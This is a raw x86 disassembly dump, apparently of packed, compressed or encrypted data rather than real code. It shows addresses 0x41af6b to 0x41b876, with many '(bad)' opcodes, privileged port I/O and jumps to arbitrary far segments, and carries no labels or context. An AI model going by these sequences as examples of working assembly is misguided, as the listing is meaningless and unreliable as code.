  41af6b:	sub    ebp,edi
  41af6d:	stc    
  41af6e:	sub    al,0xe6
  41af70:	hlt    
  41af71:	inc    ecx
  41af72:	xchg   DWORD PTR [eax],ebp
  41af74:	das    
  41af75:	or     al,0xdc
  41af77:	add    cl,BYTE PTR [ebx]
  41af79:	push   ecx
  41af7a:	mov    WORD PTR [ebx+0x1f],es
  41af7d:	mov    DWORD PTR [ebp+eax*2+0xd],0xa0baa4f0
  41af85:	scas   al,BYTE PTR es:[edi]
  41af86:	cwde   
  41af87:	sub    BYTE PTR [edi],bl
  41af89:	in     eax,dx
  41af8a:	jl     0x41b009
  41af8c:	inc    ecx
  41af8d:	jbe    0x41af50
  41af8f:	jg     0x41af5c
  41af91:	dec    ebp
  41af92:	das    
  41af93:	in     eax,0xfb
  41af95:	xchg   esp,eax
  41af96:	jno    0x41af3d
  41af98:	push   cs
  41af99:	push   cs
  41af9a:	sbb    eax,0xb728c081
  41af9f:	(bad)  
  41afa0:	gs jmp 0xf18f630e
  41afa6:	imul   ecx,DWORD PTR [ebx+0x4da24be4],0x8d975a32
  41afb0:	loop   0x41affe
  41afb2:	pushf  
  41afb3:	sbb    edx,DWORD PTR [esi+0x1f]
  41afb6:	jo     0x41b00a
  41afb8:	jae    0x41afb3
  41afba:	repnz sbb al,BYTE PTR [edi]
  41afbd:	add    edx,DWORD PTR [ebx+edi*4+0x2ac2ef81]
  41afc4:	add    ch,ch
  41afc6:	pop    es
  41afc7:	test   al,0x1d
  41afc9:	das    
  41afca:	shl    DWORD PTR [edx],cl
  41afcc:	rcr    bl,cl
  41afce:	push   ecx
  41afcf:	xor    BYTE PTR [edi],cl
  41afd1:	lds    ecx,FWORD PTR [esi]
  41afd3:	jns    0x41b02f
  41afd5:	xor    DWORD PTR ds:0x22c205ab,eax
  41afdb:	sub    BYTE PTR [ebp-0x11],dl
  41afde:	sti    
  41afdf:	scas   al,BYTE PTR es:[edi]
  41afe0:	cmc    
  41afe1:	dec    ebp
  41afe2:	jne    0x41b061
  41afe4:	(bad)  
  41afe5:	popa   
  41afe6:	cmp    BYTE PTR ds:0x49f5db1,bh
  41afec:	jbe    0x41afd5
  41afee:	xchg   edx,eax
  41afef:	(bad)  
  41aff0:	imul   ebx,DWORD PTR [ecx],0x1ae10c02
  41aff6:	adc    edx,esi
  41aff8:	sub    eax,0x3de54975
  41affd:	shl    DWORD PTR [esi],1
  41afff:	mov    ebp,0xf4924fa8
  41b004:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b005:	or     al,0xc
  41b007:	jnp    0x41af9a
  41b009:	int3   
  41b00a:	sub    edx,DWORD PTR [ebx-0x41]
  41b00d:	rcr    DWORD PTR [edi],0xb0
  41b010:	pop    edi
  41b011:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b012:	dec    edx
  41b013:	and    esi,DWORD PTR [edx-0x6b]
  41b016:	fstp   QWORD PTR [esi+ecx*2-0x22]
  41b01a:	push   es
  41b01b:	sahf   
  41b01c:	pushf  
  41b01d:	aaa    
  41b01e:	add    DWORD PTR [ecx],esi
  41b020:	mov    esp,0x6f9af0d3
  41b025:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b026:	inc    ebp
  41b027:	inc    ebx
  41b028:	fsub   DWORD PTR [ebp-0x50daf68]
  41b02e:	cld    
  41b02f:	scas   eax,DWORD PTR es:[edi]
  41b030:	push   esp
  41b031:	mov    ebp,ds
  41b033:	xchg   edx,eax
  41b034:	mov    dh,0xba
  41b036:	lock cs xor eax,0x718a083a
  41b03d:	xchg   esp,eax
  41b03e:	cmp    al,0x52
  41b040:	inc    edx
  41b041:	js     0x41afcd
  41b043:	icebp  
  41b044:	out    dx,eax
  41b045:	mov    ah,0xdb
  41b047:	jbe    0x41b010
  41b049:	shr    bh,cl
  41b04b:	in     eax,dx
  41b04c:	push   DWORD PTR [esi-0x66]
  41b04f:	bound  ebp,QWORD PTR [edi+0x2]
  41b052:	fs push cs
  41b054:	shr    DWORD PTR [esi],cl
  41b056:	adc    edx,DWORD PTR [ebp-0x37]
  41b059:	je     0x41b04e
  41b05b:	ret    
  41b05c:	xchg   ebx,eax
  41b05d:	arpl   WORD PTR cs:[ebp-0x70c20b4e],bp
  41b064:	into   
  41b065:	or     BYTE PTR [ebx],ah
  41b067:	sbb    ecx,DWORD PTR [eax-0x4d5e55ba]
  41b06d:	dec    eax
  41b06e:	add    al,0xf8
  41b070:	loop   0x41aff4
  41b072:	out    dx,al
  41b073:	or     ecx,DWORD PTR [edx]
  41b075:	or     BYTE PTR [ebx-0x100ff492],cl
  41b07b:	ror    DWORD PTR ds:0x2ae1cea1,1
  41b081:	mov    eax,0x3e47455b
  41b086:	in     al,dx
  41b087:	push   0xffffffbd
  41b089:	retf   
  41b08a:	ror    BYTE PTR [eax+0x38807a33],0x39
  41b091:	pop    ebx
  41b092:	aaa    
  41b093:	xchg   ebp,eax
  41b094:	inc    ecx
  41b095:	sbb    eax,0x62f5777d
  41b09a:	loop   0x41b0d8
  41b09c:	adc    edx,esi
  41b09e:	or     DWORD PTR [ebx+0x54f3358d],eax
  41b0a4:	ins    DWORD PTR es:[edi],dx
  41b0a5:	sbb    DWORD PTR [eax-0x19],0x22bf1e83
  41b0ac:	sub    ah,bl
  41b0ae:	xor    eax,0x22c28760
  41b0b3:	mov    edi,0x66730d13
  41b0b8:	mov    al,ds:0x22e73ce7
  41b0bd:	mov    bh,0x34
  41b0bf:	adc    DWORD PTR [ebx+edx*4+0x59],edi
  41b0c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0c4:	mov    eax,0x34d8e1a6
  41b0c9:	jle    0x41b04e
  41b0cb:	cmp    BYTE PTR [esi+0x1f547672],al
  41b0d1:	rcr    BYTE PTR [edx],0x20
  41b0d4:	sub    BYTE PTR [edx+0x2cafc195],cl
  41b0da:	inc    esp
  41b0db:	xor    DWORD PTR [esi],ebx
  41b0dd:	mov    edi,0xd649dfcb
  41b0e2:	outs   dx,DWORD PTR ds:[esi]
  41b0e3:	add    BYTE PTR [eax-0x5a],ah
  41b0e6:	neg    esp
  41b0e8:	jno    0x41b0ff
  41b0ea:	inc    esi
  41b0eb:	aaa    
  41b0ec:	push   es
  41b0ed:	inc    ebx
  41b0ee:	xor    BYTE PTR [esi],0x12
  41b0f1:	jmp    0x41b172
  41b0f3:	out    0x8e,al
  41b0f5:	jg     0x41b08e
  41b0f7:	jno    0x41b0e5
  41b0f9:	mov    ebp,0xda85f773
  41b0fe:	jbe    0x41b0cb
  41b100:	jo     0x41b120
  41b102:	jne    0x41b15a
  41b104:	or     eax,0x3e463552
  41b109:	push   0xbea54e40
  41b10e:	sbb    al,0x6f
  41b110:	(bad)  
  41b111:	ins    DWORD PTR es:[edi],dx
  41b112:	aad    0xd9
  41b114:	aaa    
  41b115:	mov    bh,0x78
  41b117:	cmp    eax,esp
  41b119:	test   al,0xd2
  41b11b:	or     DWORD PTR [edi-0x47],ebx
  41b11e:	cmp    ch,ch
  41b120:	inc    ebx
  41b121:	jnp    0x41b15e
  41b123:	pushf  
  41b124:	and    al,0x8c
  41b126:	jg     0x41b191
  41b128:	push   esi
  41b129:	fcom   DWORD PTR [ebx+0x2d]
  41b12c:	jle    0x41b10e
  41b12e:	outs   dx,DWORD PTR ds:[esi]
  41b12f:	cli    
  41b130:	retf   
  41b131:	adc    dh,BYTE PTR [esi+edi*8-0x139d624e]
  41b138:	mov    ebx,0xa03dff40
  41b13d:	push   edx
  41b13e:	dec    edi
  41b13f:	xchg   esi,eax
  41b140:	mov    dh,dl
  41b142:	push   0x91c0c302
  41b147:	fdiv   DWORD PTR [eax-0x7e697bc5]
  41b14d:	in     al,0xc7
  41b14f:	cmp    BYTE PTR [edx-0x12473a29],0x4b
  41b156:	sub    al,0x12
  41b158:	hlt    
  41b159:	xor    esp,edi
  41b15b:	dec    edx
  41b15c:	bound  edi,QWORD PTR [edx-0x5dec5735]
  41b162:	int3   
  41b163:	and    DWORD PTR [ecx-0x53b5ee03],ebx
  41b169:	push   esp
  41b16a:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41b16c:	xchg   edx,eax
  41b16d:	xor    bl,BYTE PTR [ebp-0x7ded1c65]
  41b173:	sbb    edx,edx
  41b175:	and    eax,ecx
  41b177:	dec    edi
  41b178:	iret   
  41b179:	dec    edx
  41b17a:	sub    al,BYTE PTR [edx+eax*8]
  41b17d:	rcr    BYTE PTR [ebp+0x63bd6aad],0xeb
  41b184:	inc    edi
  41b185:	daa    
  41b186:	jo     0x41b192
  41b188:	pop    ebp
  41b189:	pop    eax
  41b18a:	std    
  41b18b:	pop    ss
  41b18c:	dec    esp
  41b18d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b18e:	pusha  
  41b18f:	adc    esp,ecx
  41b191:	cmp    ebx,DWORD PTR [esi+esi*8-0x22c83744]
  41b198:	loope  0x41b155
  41b19a:	jl     0x41b15e
  41b19c:	(bad)  
  41b19d:	mov    ah,0xf8
  41b19f:	out    dx,al
  41b1a0:	mov    dl,0x41
  41b1a2:	pop    ss
  41b1a3:	ret    
  41b1a4:	cld    
  41b1a5:	aam    0xfa
  41b1a7:	push   edx
  41b1a8:	jne    0x41b160
  41b1aa:	repz repnz dec ecx
  41b1ad:	lea    eax,[ebp-0x66103ecf]
  41b1b3:	add    BYTE PTR [esi-0x2d3a617d],bh
  41b1b9:	fild   DWORD PTR [edi+0x12]
  41b1bc:	inc    ecx
  41b1bd:	sub    DWORD PTR [esi+edi*4],edi
  41b1c0:	sub    eax,0x25f1fff4
  41b1c5:	dec    edx
  41b1c6:	(bad)  
  41b1c7:	loope  0x41b234
  41b1c9:	inc    edx
  41b1ca:	xor    ebx,ecx
  41b1cc:	or     dh,BYTE PTR [edi-0x2a]
  41b1cf:	addr16 mov al,0x59
  41b1d2:	loope  0x41b19e
  41b1d4:	add    ebp,DWORD PTR [esi+0x42]
  41b1d7:	or     eax,0x7c4e960c
  41b1dc:	adc    DWORD PTR [esi-0x57],0x5d
  41b1e0:	pop    eax
  41b1e1:	dec    edi
  41b1e2:	push   ecx
  41b1e3:	ins    BYTE PTR es:[edi],dx
  41b1e4:	add    DWORD PTR [edi],esi
  41b1e6:	ret    
  41b1e7:	jbe    0x41b247
  41b1e9:	es jmp 0x41b251
  41b1ec:	test   BYTE PTR [esi],0x71
  41b1ef:	push   ebp
  41b1f0:	or     esi,esi
  41b1f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1f3:	mov    DWORD PTR [ecx],esi
  41b1f5:	fwait
  41b1f6:	pop    es
  41b1f7:	jns    0x41b26c
  41b1f9:	mov    dl,0x7e
  41b1fb:	loop   0x41b1ff
  41b1fd:	cmp    al,0xdb
  41b1ff:	add    eax,0x6ae534c3
  41b204:	pop    ebx
  41b205:	push   0xc5b5bed7
  41b20a:	lods   al,BYTE PTR ds:[esi]
  41b20b:	pushf  
  41b20c:	pop    eax
  41b20d:	xchg   edi,eax
  41b20e:	in     eax,0xf2
  41b210:	loopne 0x41b1a8
  41b212:	out    0x71,eax
  41b214:	ss jb  0x41b23d
  41b217:	inc    esp
  41b218:	dec    ebp
  41b219:	in     eax,0x26
  41b21b:	ins    BYTE PTR es:[edi],dx
  41b21c:	clc    
  41b21d:	jge    0x41b1d8
  41b21f:	xchg   esi,eax
  41b220:	push   ds
  41b221:	ret    
  41b222:	shl    DWORD PTR [eax],0x11
  41b225:	aad    0xcd
  41b227:	or     DWORD PTR [ecx],eax
  41b229:	cld    
  41b22a:	sub    eax,DWORD PTR [eax+0x22]
  41b22d:	retf   
  41b22e:	add    al,0x5c
  41b230:	not    DWORD PTR [esp+edi*4+0x4bbd86ad]
  41b237:	xchg   ecx,eax
  41b238:	inc    ecx
  41b239:	shl    BYTE PTR [esp+ecx*1],1
  41b23c:	sti    
  41b23d:	sar    BYTE PTR [esi-0x67],0xbb
  41b241:	or     DWORD PTR [esp+ebx*2-0x1ffbfcf7],eax
  41b248:	scas   eax,DWORD PTR es:[edi]
  41b249:	push   ss
  41b24a:	sahf   
  41b24b:	mov    ebx,0xdcc4b992
  41b250:	scas   eax,DWORD PTR es:[edi]
  41b251:	cmp    al,0x1b
  41b253:	ins    DWORD PTR es:[edi],dx
  41b254:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b255:	mov    esp,ecx
  41b257:	fsubr  QWORD PTR [ebp+0x462397ba]
  41b25d:	loopne 0x41b1f4
  41b25f:	aas    
  41b260:	mov    dh,ah
  41b262:	mov    dh,0xa4
  41b264:	pmovmskb eax,mm1
  41b267:	test   BYTE PTR [eax-0x13eeb692],ah
  41b26d:	sub    DWORD PTR [edi],esp
  41b26f:	icebp  
  41b270:	cld    
  41b271:	fsub   QWORD PTR [edx+0x55]
  41b274:	lods   al,BYTE PTR ds:[esi]
  41b275:	mov    ds:0x49d6ea77,eax
  41b27a:	rcr    BYTE PTR [ecx-0x76],0xd6
  41b27e:	jp     0x41b23f
  41b280:	mov    eax,ds:0xd6fb35ca
  41b285:	sub    BYTE PTR [ebx-0x33a42033],al
  41b28b:	xchg   esi,eax
  41b28d:	xchg   esi,eax
  41b28e:	pop    esp
  41b28f:	inc    DWORD PTR [ecx]
  41b291:	inc    ebx
  41b292:	mov    dh,0xc1
  41b294:	adc    BYTE PTR [ebx+0x12a6d2b1],bl
  41b29a:	jb     0x41b2ca
  41b29c:	adc    BYTE PTR [esi+0x37c87492],cl
  41b2a2:	xchg   esi,eax
  41b2a3:	mov    ds:0x5bba892,al
  41b2a8:	pop    esi
  41b2a9:	in     al,0x3
  41b2ab:	fstp   DWORD PTR [edi+eax*4]
  41b2ae:	inc    ecx
  41b2af:	inc    edi
  41b2b0:	push   ecx
  41b2b1:	test   bh,dl
  41b2b3:	outs   dx,BYTE PTR ds:[esi]
  41b2b4:	mov    dh,0x48
  41b2b6:	lea    esi,[edi+edx*2-0x4a]
  41b2ba:	(bad)  
  41b2bb:	mov    edi,0x69f353c8
  41b2c0:	aaa    
  41b2c1:	adc    esi,DWORD PTR [ebp+0x1f]
  41b2c4:	test   BYTE PTR [edi],cl
  41b2c6:	cdq    
  41b2c7:	inc    esp
  41b2c8:	sub    DWORD PTR [esi+0x689dbf91],ecx
  41b2ce:	or     dl,BYTE PTR [ebp+0xd]
  41b2d1:	mov    esp,0xcaaf289e
  41b2d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2d7:	jp     0x41b2fa
  41b2d9:	scas   al,BYTE PTR es:[edi]
  41b2da:	cmp    al,0x78
  41b2dc:	adc    DWORD PTR [eax],esp
  41b2de:	not    DWORD PTR [esi-0x7593e702]
  41b2e4:	repz cwde 
  41b2e6:	ins    BYTE PTR es:[edi],dx
  41b2e7:	stos   BYTE PTR es:[edi],al
  41b2e8:	rcr    cl,0x93
  41b2eb:	jb     0x41b358
  41b2ed:	cld    
  41b2ee:	iret   
  41b2ef:	xor    ah,bh
  41b2f1:	jb     0x41b368
  41b2f3:	loopne 0x41b298
  41b2f5:	cmp    DWORD PTR [eax+0x58],edi
  41b2f8:	mov    esi,0xdfd3d250
  41b2fd:	ds jmp 0x5755:0xcd79dc8b
  41b305:	enter  0x9c29,0xe4
  41b309:	es push ecx
  41b30b:	shl    BYTE PTR ds:0x2463b012,0x5b
  41b312:	adc    dl,BYTE PTR [edi+0x619ac034]
  41b318:	cld    
  41b319:	mov    ebx,esp
  41b31b:	out    0xf9,eax
  41b31d:	or     ecx,DWORD PTR [ecx+0x6b]
  41b320:	outs   dx,BYTE PTR ds:[esi]
  41b321:	pusha  
  41b322:	jae    0x41b2b9
  41b324:	xchg   edx,eax
  41b325:	inc    ebp
  41b326:	mov    al,ds:0x5fbc62ee
  41b32b:	fidiv  WORD PTR [esp+edi*4]
  41b32e:	or     ch,BYTE PTR [ebx]
  41b330:	sahf   
  41b331:	xchg   esp,eax
  41b332:	out    dx,al
  41b333:	test   al,0x6
  41b335:	jl     0x41b3b0
  41b337:	test   al,0x67
  41b339:	push   ebx
  41b33a:	loopne 0x41b307
  41b33c:	dec    ebx
  41b33d:	mov    dh,al
  41b33f:	cs inc edi
  41b341:	lods   al,BYTE PTR ds:[esi]
  41b342:	ins    DWORD PTR es:[edi],dx
  41b343:	loope  0x41b2dd
  41b345:	test   al,0x9e
  41b347:	jge    0x41b38b
  41b349:	dec    esp
  41b34a:	mov    ds:0xdaa4bfed,eax
  41b34f:	dec    ebp
  41b350:	aam    0x21
  41b352:	add    eax,edx
  41b354:	xor    BYTE PTR [edx],cl
  41b356:	cmp    ah,BYTE PTR [ebp-0x2]
  41b359:	push   ebx
  41b35a:	sbb    DWORD PTR [edi],ebp
  41b35c:	div    BYTE PTR [edi-0x49]
  41b35f:	(bad)  
  41b360:	mov    fs,WORD PTR [esi+0x24]
  41b363:	mov    ecx,0x5bc31b32
  41b368:	shl    DWORD PTR ds:0x325f80bc,0xa3
  41b36f:	retf   
  41b370:	popa   
  41b371:	mov    WORD PTR [esi],fs
  41b373:	repz or eax,eax
  41b376:	icebp  
  41b377:	inc    esi
  41b378:	clc    
  41b379:	leave  
  41b37a:	jmp    0x16a8:0xef5cbb4
  41b381:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b382:	and    al,0xa5
  41b384:	pop    ebx
  41b385:	daa    
  41b386:	jle    0x41b37b
  41b388:	sbb    eax,0x38876727
  41b38d:	adc    ecx,DWORD PTR [edi+ecx*1-0x26]
  41b391:	fwait
  41b392:	cli    
  41b393:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b394:	and    BYTE PTR [edi-0x13],al
  41b397:	mov    edx,0x3314c1a9
  41b39c:	scas   eax,DWORD PTR es:[edi]
  41b39d:	in     eax,0xb7
  41b39f:	stc    
  41b3a0:	mov    ds:0xdf0ba14,eax
  41b3a5:	xchg   esi,eax
  41b3a6:	pop    edi
  41b3a7:	sbb    esp,DWORD PTR [eax]
  41b3a9:	shl    BYTE PTR [ecx+0x65a7ce20],cl
  41b3af:	stos   BYTE PTR es:[edi],al
  41b3b0:	sti    
  41b3b1:	mov    cl,0xfb
  41b3b3:	imul   edx,DWORD PTR [esi+0x56],0xffffff80
  41b3b7:	jns    0x41b33e
  41b3b9:	fdivp  st(1),st
  41b3bb:	mov    esi,0x4a1f1886
  41b3c0:	pushf  
  41b3c1:	mov    al,ds:0xab983dd4
  41b3c6:	fmulp  st(3),st
  41b3c8:	jae    0x41b440
  41b3ca:	and    cl,ah
  41b3cc:	jns    0x41b44a
  41b3ce:	jmp    0x1913:0xb4cc30b6
  41b3d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3d6:	cmp    bl,ah
  41b3d8:	(bad)
  41b3dc:	imul   esp,esi,0x9350dfa3
  41b3e2:	push   esi
  41b3e3:	fcmovnbe st,st(6)
  41b3e5:	mov    edx,0x2c0fdb97
  41b3ea:	pop    eax
  41b3eb:	mov    bh,0x27
  41b3ed:	cdq    
  41b3ee:	cmp    BYTE PTR [esi],0xb6
  41b3f1:	add    esp,ebx
  41b3f3:	add    DWORD PTR [ecx-0x4c764596],0xffffffbf
  41b3fa:	ror    DWORD PTR [edx+0x20],cl
  41b3fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3fe:	(bad)  
  41b3ff:	psadbw mm6,QWORD PTR [edi-0x1e6eb3a3]
  41b406:	mov    ebp,0x5b710bff
  41b40b:	mov    ah,BYTE PTR [eax-0x7abc0c94]
  41b411:	in     eax,0xe2
  41b413:	mov    ds:0xa40d30ec,al
  41b418:	pop    ss
  41b419:	pop    ebx
  41b41a:	imul   ecx,DWORD PTR [eax+eiz*2+0x10],0x6f
  41b41f:	(bad)  
  41b420:	cli    
  41b421:	or     BYTE PTR [edi+0x77],dl
  41b424:	enter  0x3132,0x77
  41b428:	jbe    0x41b496
  41b42a:	shl    BYTE PTR [ebx+0x23],cl
  41b42d:	dec    ebx
  41b42e:	xor    esp,ebp
  41b430:	lock mov edx,0x82a6
	...
  41b612:	add    BYTE PTR [eax],al
  41b614:	jecxz  0x41b635
  41b616:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b617:	adc    al,0xfe
  41b619:	mov    ebp,0x9faffff3
  41b61e:	test   ah,0xfc
  41b621:	xchg   ebx,eax
  41b622:	cld    
  41b623:	jge    0x41b63e
  41b625:	aaa    
  41b626:	add    DWORD PTR [eax],eax
  41b628:	and    al,BYTE PTR [edi]
  41b62a:	add    BYTE PTR [eax],al
  41b62c:	sub    BYTE PTR [ecx],0xd7
  41b62f:	pushf  
  41b630:	push   ebx
  41b631:	pop    eax
  41b632:	ss push esi
  41b634:	popf   
  41b635:	out    dx,eax
  41b636:	adc    al,0x20
  41b638:	sbb    al,0x50
  41b63a:	(bad)  [edi-0x4a79b765]
  41b640:	nop
  41b641:	rcl    BYTE PTR [edi-0x5e3ba4e3],1
  41b647:	pop    ebx
  41b648:	(bad)  
  41b649:	push   ss
  41b64a:	test   al,0x8c
  41b64c:	fld    st(3)
  41b64e:	and    al,0xe1
  41b650:	clc    
  41b651:	cld    
  41b652:	cmp    ebp,DWORD PTR [edx-0x37]
  41b655:	mov    ds:0x66ee6a1c,al
  41b65a:	adc    eax,0x5efc872c
  41b65f:	adc    eax,0x1ef374c5
  41b664:	(bad)  
  41b665:	mov    ds:0xe7ef566d,al
  41b66a:	fcomp  QWORD PTR [ebx]
  41b66c:	xchg   BYTE PTR [edx+0x4cb93e1c],dl
  41b672:	pop    edx
  41b673:	loope  0x41b62d
  41b675:	loope  0x41b629
  41b677:	xor    dh,BYTE PTR ds:0xea79f79e
  41b67d:	mov    DWORD PTR [edi-0x4a],ecx
  41b680:	inc    ecx
  41b681:	dec    esp
  41b682:	add    BYTE PTR [esi-0x52b794db],0x2
  41b689:	jl     0x41b69b
  41b68b:	or     DWORD PTR [edx],eax
  41b68d:	lods   al,BYTE PTR ds:[esi]
  41b68e:	icebp  
  41b68f:	adc    BYTE PTR [esi+0x1fe5d560],bh
  41b695:	dec    DWORD PTR ds:[esi-0x5e]
  41b699:	mov    eax,ds:0x3121ab21
  41b69e:	addr16 cwde 
  41b6a0:	cmp    al,0x89
  41b6a2:	and    ebp,DWORD PTR [esi+0x58]
  41b6a5:	adc    edi,DWORD PTR [ecx+0x10]
  41b6a8:	xchg   ebp,eax
  41b6a9:	ret    
  41b6aa:	cdq    
  41b6ab:	mov    al,ds:0x759cedc4
  41b6b0:	test   DWORD PTR [ebp-0x21ce2b2a],ebp
  41b6b6:	inc    edx
  41b6b7:	push   ebp
  41b6b8:	mov    fs,esi
  41b6ba:	push   eax
  41b6bb:	or     eax,0x5bb07125
  41b6c0:	lock in al,dx
  41b6c2:	imul   ebx,DWORD PTR [edx+0x35],0xffffff9c
  41b6c6:	sub    BYTE PTR [eax],al
  41b6c8:	fimul  DWORD PTR ds:0x4d94426
  41b6ce:	add    BYTE PTR [ecx],cl
  41b6d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6d1:	js     0x41b6c6
  41b6d3:	pop    eax
  41b6d4:	dec    ecx
  41b6d5:	imul   edi,edi,0x55c48f7e
  41b6db:	xchg   edi,eax
  41b6dc:	int    0xb5
  41b6de:	add    BYTE PTR [esi],ah
  41b6e0:	fwait
  41b6e1:	push   ebx
  41b6e2:	popa   
  41b6e3:	aas    
  41b6e4:	fs test al,0xad
  41b6e7:	mov    eax,0xc368275e
  41b6ec:	mov    eax,0x22c71875
  41b6f1:	and    ecx,DWORD PTR [esi+0x7e]
  41b6f4:	out    0xed,al
  41b6f6:	arpl   WORD PTR [eax+0xd],ax
  41b6f9:	cwde   
  41b6fa:	(bad)  
  41b6fb:	jecxz  0x41b6a2
  41b6fd:	ins    DWORD PTR es:[edi],dx
  41b6fe:	es fwait
  41b700:	es loopne 0x41b73c
  41b703:	jbe    0x41b697
  41b705:	or     eax,0x3754e420
  41b70a:	pop    edx
  41b70b:	mov    dl,0xd0
  41b70d:	xchg   ebx,eax
  41b70e:	sbb    al,0x5d
  41b710:	retf   0x21a4
  41b713:	in     al,0x38
  41b715:	push   cs
  41b716:	mov    dl,BYTE PTR [esi-0x4d]
  41b719:	ja     0x41b6f5
  41b71b:	mov    dh,ah
  41b71d:	push   ss
  41b71e:	or     esi,ebx
  41b720:	jo     0x41b749
  41b722:	xlat   BYTE PTR ds:[ebx]
  41b723:	or     BYTE PTR [edi],ah
  41b725:	jl     0x41b751
  41b727:	scas   al,BYTE PTR es:[edi]
  41b728:	icebp  
  41b729:	call   0xb211:0xdec7b157
  41b730:	jmp    0x41b791
  41b732:	out    dx,al
  41b733:	bound  edx,QWORD PTR [edx+0x4a]
  41b736:	ss scas al,BYTE PTR es:[edi]
  41b738:	and    ecx,DWORD PTR [ebx-0x5725e8c0]
  41b73e:	xchg   esp,eax
  41b73f:	xchg   BYTE PTR [esp+ecx*1],bh
  41b742:	fnstcw WORD PTR [ebx]
  41b744:	shl    BYTE PTR [ecx-0x6c],cl
  41b747:	retf   0x7471
  41b74a:	xchg   edi,eax
  41b74b:	out    dx,al
  41b74c:	mov    edx,0xc18fda30
  41b751:	mov    al,0xdc
  41b753:	xor    BYTE PTR [ecx+eax*4-0x1ad63e38],dl
  41b75a:	test   BYTE PTR [ecx],bh
  41b75c:	gs inc ecx
  41b75e:	mov    ebp,0x1d29d4ec
  41b763:	adc    al,0x91
  41b765:	sar    DWORD PTR [ecx],cl
  41b767:	addr16 add ecx,ebx
  41b76a:	mov    al,ds:0xf8fe527c
  41b76f:	xchg   esp,eax
  41b770:	add    eax,0xcfe47df
  41b775:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b776:	jl     0x41b73a
  41b778:	sbb    bl,BYTE PTR [ebx+ecx*4-0x7a]
  41b77c:	xor    eax,0x23870f93
  41b781:	xor    BYTE PTR [esi-0x66],bh
  41b784:	js     0x41b724
  41b786:	(bad)  
  41b787:	out    0x18,al
  41b789:	cld    
  41b78a:	int3   
  41b78b:	jge    0x41b7d0
  41b78d:	cwde   
  41b78e:	xchg   edi,eax
  41b78f:	loope  0x41b75c
  41b791:	stos   BYTE PTR es:[edi],al
  41b792:	loope  0x41b755
  41b794:	enter  0xfbfd,0x9d
  41b798:	push   esi
  41b799:	dec    ebp
  41b79a:	mov    dl,0x48
  41b79c:	xchg   BYTE PTR [ecx],dh
  41b79e:	and    DWORD PTR [eax+esi*2-0x53],0x7e
  41b7a3:	inc    eax
  41b7a4:	mov    ecx,0xe17b5859
  41b7a9:	pop    eax
  41b7aa:	add    dh,0x90
  41b7ad:	mov    eax,0xefdd1b36
  41b7b2:	outs   dx,DWORD PTR ds:[esi]
  41b7b3:	jl     0x41b77e
  41b7b5:	or     al,BYTE PTR [edx+0x5f7fd1a1]
  41b7bb:	mov    esp,0x675889f7
  41b7c0:	fcomp  DWORD PTR [esp-0x4ed06e55]
  41b7c7:	push   esp
  41b7c8:	push   0x5357d095
  41b7cd:	mov    esi,0x19f0ab3c
  41b7d2:	pushf  
  41b7d3:	mov    edx,0xa8084979
  41b7d8:	pusha  
  41b7d9:	std    
  41b7da:	loope  0x41b77b
  41b7dc:	dec    edi
  41b7dd:	dec    ecx
  41b7de:	fbstp  TBYTE PTR [eax-0xd]
  41b7e1:	and    al,0x9c
  41b7e3:	cmp    al,dl
  41b7e5:	mov    edx,0x8f1860ab
  41b7ea:	out    dx,eax
  41b7eb:	sub    eax,0xdf5a75b0
  41b7f0:	sbb    ch,BYTE PTR [edi+eiz*8-0x22]
  41b7f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7f5:	fs push ecx
  41b7f7:	stc    
  41b7f8:	mov    ecx,0xbb4165bd
  41b7fd:	aaa    
  41b7fe:	cdq    
  41b7ff:	sub    BYTE PTR [edi+0x86f584f],cl
  41b805:	xor    DWORD PTR [ebp-0x1d],esp
  41b808:	out    dx,al
  41b809:	xchg   esi,eax
  41b80a:	fld    QWORD PTR [edi+0x70]
  41b80d:	mov    WORD PTR [esi+0x23663b02],fs
  41b813:	add    al,0xd1
  41b815:	lds    esi,FWORD PTR [ecx+0x3c]
  41b818:	fidiv  WORD PTR [esi-0x59]
  41b81b:	xor    al,bh
  41b81d:	jl     0x41b7e9
  41b81f:	je     0x41b85c
  41b821:	int    0x5
  41b823:	adc    DWORD PTR [esi+0x69197f48],edx
  41b829:	xchg   ecx,eax
  41b82a:	sbb    eax,0xfe2d4c0e
  41b82f:	xor    al,0xda
  41b831:	xor    BYTE PTR ds:0x69013a9a,bl
  41b837:	pop    edx
  41b838:	das    
  41b839:	sub    al,BYTE PTR [bp+di]
  41b83c:	push   0x6b
  41b83e:	cdq    
  41b83f:	jae    0x41b842
  41b841:	test   eax,0xc7fab4c0
  41b846:	cdq    
  41b847:	sbb    esi,edi
  41b849:	jg     0x41b834
  41b84b:	rol    BYTE PTR [ebp+0x13],0xb9
  41b84f:	fmulp  st(4),st
  41b851:	push   ebp
  41b852:	std    
  41b853:	rcr    esp,1
  41b855:	fild   DWORD PTR [edx+0x5c]
  41b858:	fs (bad) 
  41b85b:	stos   BYTE PTR es:[edi],al
  41b85c:	mov    cl,0x3d
  41b85e:	(bad)  
  41b85f:	sub    BYTE PTR [esi+0x0],ah
  41b862:	jns    0x41b898
  41b864:	fcomi  st,st(5)
  41b866:	mov    ecx,ds
  41b868:	xchg   edx,eax
  41b869:	add    al,bl
  41b86b:	jae    0x41b829
  41b86d:	fmul   QWORD PTR [ecx+0x3a]
  41b870:	and    esi,DWORD PTR [edx-0x40]
  41b873:	loop   0x41b800
  41b875:	outs   dx,DWORD PTR ds:[esi]
  41b876:	inc    ecx
